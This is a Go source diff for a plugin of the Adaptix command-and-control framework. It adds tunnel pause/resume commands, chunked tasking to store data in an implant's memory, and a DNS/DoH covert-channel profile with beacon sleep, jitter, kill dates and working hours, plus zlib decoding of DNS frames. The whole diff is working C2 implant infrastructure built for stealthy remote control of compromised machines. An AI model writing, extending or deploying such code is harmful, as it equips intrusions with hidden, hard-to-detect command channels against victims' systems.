@@ -1,13 +1,19 @@
 package main
 
 import (
+	"bytes"
+	"compress/zlib"
 	"crypto/rc4"
 	"errors"
 	"fmt"
+	"io"
+	"math/rand/v2"
 	"net"
 	"regexp"
 	"strconv"
 	"strings"
+
+	adaptix "github.com/Adaptix-Framework/axc2"
 )
 
 const (
@@ -45,6 +51,8 @@ const (
 	COMMAND_TUNNEL_CLOSE     = 66
 	COMMAND_TUNNEL_REVERSE   = 67
 	COMMAND_TUNNEL_ACCEPT    = 68
+	COMMAND_TUNNEL_PAUSE     = 69
+	COMMAND_TUNNEL_RESUME    = 70
 
 	COMMAND_SHELL_START  = 71
 	COMMAND_SHELL_WRITE  = 72
@@ -94,10 +102,45 @@ const (
 	BOF_ERROR_ALLOC     = 0x105
 )
 
+// DNS Constants
+const (
+	dnsDefaultLabelSize = 48
+	dnsMaxLabelSize     = 63
+	dnsFrameHeaderSize  = 5 // flags:1 + origLen:4
+	dnsCompressFlag     = 0x1
+)
+
+func CreateTaskCommandSaveMemory(ts Teamserver, agentId string, buffer []byte) int {
+	chunkSize := 0x100000 // 1Mb
+	memoryId := int(rand.Uint32())
+
+	bufferSize := len(buffer)
+
+	taskData := adaptix.TaskData{
+		Type:    adaptix.TASK_TYPE_TASK,
+		AgentId: agentId,
+		Sync:    false,
+	}
+
+	for start := 0; start < bufferSize; start += chunkSize {
+		fin := start + chunkSize
+		if fin > bufferSize {
+			fin = bufferSize
+		}
+
+		array := []interface{}{COMMAND_SAVEMEMORY, memoryId, bufferSize, fin - start, buffer[start:fin]}
+		taskData.Data, _ = PackArray(array)
+		taskData.TaskId = fmt.Sprintf("%08x", rand.Uint32())
+
+		ts.TsTaskCreate(agentId, "", "", taskData)
+	}
+	return memoryId
+}
+
 func GetOsVersion(majorVersion uint8, minorVersion uint8, buildNumber uint, isServer bool, systemArch string) (int, string) {
 	var (
 		desc string
-		os   = OS_UNKNOWN
+		os   = adaptix.OS_UNKNOWN
 	)
 
 	osVersion := "unknown"
@@ -129,19 +172,19 @@ func GetOsVersion(majorVersion uint8, minorVersion uint8, buildNumber uint, isSe
 
 	desc = osVersion + " " + systemArch
 	if strings.Contains(osVersion, "Win") {
-		os = OS_WINDOWS
+		os = adaptix.OS_WINDOWS
 	}
 	return os, desc
 }
 
 func int32ToIPv4(ip uint) string {
-	bytes := []byte{
+	b := []byte{
 		byte(ip),
 		byte(ip >> 8),
 		byte(ip >> 16),
 		byte(ip >> 24),
 	}
-	return net.IP(bytes).String()
+	return net.IP(b).String()
 }
 
 func SizeBytesToFormat(bytes int64) string {
@@ -157,9 +200,8 @@ func SizeBytesToFormat(bytes int64) string {
 		return fmt.Sprintf("%.2f Gb", size/GB)
 	} else if size >= MB {
 		return fmt.Sprintf("%.2f Mb", size/MB)
-	} else {
-		return fmt.Sprintf("%.2f Kb", size/KB)
 	}
+	return fmt.Sprintf("%.2f Kb", size/KB)
 }
 
 func RC4Crypt(data []byte, key []byte) ([]byte, error) {
@@ -228,4 +270,139 @@ func parseStringToWorkingTime(WorkingTime string) (int, error) {
 	}
 
 	return IntWorkingTime, nil
+}
+
+func formatBurstStatus(enabled int, sleepMs int, jitterPct int) string {
+	if enabled == 0 {
+		return "off"
+	}
+	return fmt.Sprintf("on (sleep=%dms, jitter=%d%%)", sleepMs, jitterPct)
+}
+
+func buildDNSProfileParams(generateConfig GenerateConfig, listenerMap map[string]any, listenerWM string, agentWatermark int64, killDate int, workingTime int, userAgent string) ([]interface{}, error) {
+
+	domain, _ := listenerMap["domain"].(string)
+
+	resolvers := generateConfig.DnsResolvers
+	if resolvers == "" {
+		resolvers, _ = listenerMap["resolvers"].(string)
+	}
+
+	dohResolvers := generateConfig.DohResolvers
+	if dohResolvers == "" {
+		dohResolvers = "https://dns.google/dns-query,https://cloudflare-dns.com/dns-query,https://dns.quad9.net/dns-query"
+	}
+
+	// DNS mode: 0=UDP, 1=DoH, 2=UDP->DoH fallback, 3=DoH->UDP fallback
+	dnsMode := 0 // Default to UDP
+	switch generateConfig.DnsMode {
+	case "DNS (Direct UDP)":
+		dnsMode = 0
+	case "DoH (DNS over HTTPS)":
+		dnsMode = 1
+	case "DNS -> DoH fallback":
+		dnsMode = 2
+	case "DoH -> DNS fallback":
+		dnsMode = 3
+	}
+
+	qtype, _ := listenerMap["qtype"].(string)
+
+	pktSizeF, _ := listenerMap["pkt_size"].(float64)
+	ttlF, _ := listenerMap["ttl"].(float64)
+	labelSizeF, _ := listenerMap["label_size"].(float64)
+
+	pktSize := int(pktSizeF)
+	ttl := int(ttlF)
+	labelSize := int(labelSizeF)
+	if labelSize <= 0 || labelSize > dnsMaxLabelSize {
+		labelSize = dnsDefaultLabelSize
+	}
+
+	seconds, err := parseDurationToSeconds(generateConfig.Sleep)
+	if err != nil {
+		return nil, err
+	}
+
+	lWatermark, _ := strconv.ParseInt(listenerWM, 16, 64)
+
+	burstEnabledF, _ := listenerMap["burst_enabled"].(bool)
+	burstSleepF, _ := listenerMap["burst_sleep"].(float64)
+	burstJitterF, _ := listenerMap["burst_jitter"].(float64)
+
+	burstEnabled := 0
+	if burstEnabledF {
+		burstEnabled = 1
+	}
+	burstSleep := int(burstSleepF)
+	if burstSleep <= 0 {
+		burstSleep = 50
+	}
+	burstJitter := int(burstJitterF)
+	if burstJitter < 0 || burstJitter > 90 {
+		burstJitter = 0
+	}
+
+	params := []interface{}{
+		int(agentWatermark),
+		// ProfileDNS
+		domain,
+		resolvers,
+		dohResolvers,
+		qtype,
+		pktSize,
+		labelSize,
+		ttl,
+		burstEnabled,
+		burstSleep,
+		burstJitter,
+		dnsMode, // DNS mode (0=UDP, 1=DoH, 2=UDP->DoH, 3=DoH->UDP)
+		userAgent,
+		int(lWatermark),
+		killDate,
+		workingTime,
+		seconds,
+		generateConfig.Jitter,
+	}
+
+	return params, nil
+}
+
+func appendDNSObjectFiles(files string, objectDir string, ext string) string {
+	files += objectDir + "/DnsCodec" + ext + " "
+	files += objectDir + "/miniz" + ext + " "
+	return files
+}
+
+func decompressZlibData(data []byte) ([]byte, bool) {
+	if len(data) < dnsFrameHeaderSize {
+		return data, false
+	}
+	flags := data[0]
+	origLen := int(data[1]) | int(data[2])<<8 | int(data[3])<<16 | int(data[4])<<24
+
+	if origLen <= 0 {
+		return data, false
+	}
+
+	payload := data[dnsFrameHeaderSize:]
+	if (flags & dnsCompressFlag) != 0 {
+		r, err := zlib.NewReader(bytes.NewReader(payload))
+		if err != nil {
+			return data, false
+		}
+		var buf bytes.Buffer
+		_, err = io.Copy(&buf, r)
+		_ = r.Close()
+		if err == nil && buf.Len() == origLen {
+			return buf.Bytes(), true
+		}
+		return data, false
+	}
+
+	if len(payload) == origLen {
+		return payload, true
+	}
+
+	return data, false
 }
